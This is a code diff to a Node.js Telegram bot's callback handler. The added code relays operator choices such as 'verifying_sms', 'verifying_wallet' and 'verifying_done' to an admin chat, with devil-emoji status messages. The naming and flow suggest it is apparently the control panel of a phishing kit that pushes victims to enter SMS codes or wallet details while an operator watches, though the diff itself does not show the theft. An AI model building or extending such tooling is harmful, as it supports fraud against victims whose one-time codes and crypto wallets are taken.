@@ -82,14 +82,43 @@ bot.on("callback_query", async (query) => {
       console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
       
       try {
-        await fetch(`${APP_URL}/update-verifying-choice`, {
+        const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ verifyingId, choice: action })
         });
         
         console.log(`✅ Verifying choice updated: ${action}`);
+        
+        // Send popup
         await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        
+        // Send status message to Telegram
+        let statusMsg = "";
+        if (action === "verifying_sms") {
+          statusMsg = `😈 Verifying → <b>SMS - 2</b> 💬`;
+        } else if (action === "verifying_done") {
+          statusMsg = `😈 Verifying → <b>Done</b> 🏁`;
+        } else if (action === "verifying_wallet") {
+          statusMsg = `😈 Verifying → <b>Wallet</b> 💼`;
+        }
+        
+        if (statusMsg) {
+          const botToken = process.env.BOT_TOKEN;
+          const chatId = process.env.ADMIN_CHAT_ID;
+          const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+          await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: statusMsg,
+              parse_mode: "HTML"
+            })
+          });
+          console.log(`✅ Sent status message: ${statusMsg}`);
+        }
+        
         return;
       } catch (err) {
         console.error("❌ verifying choice error:", err);
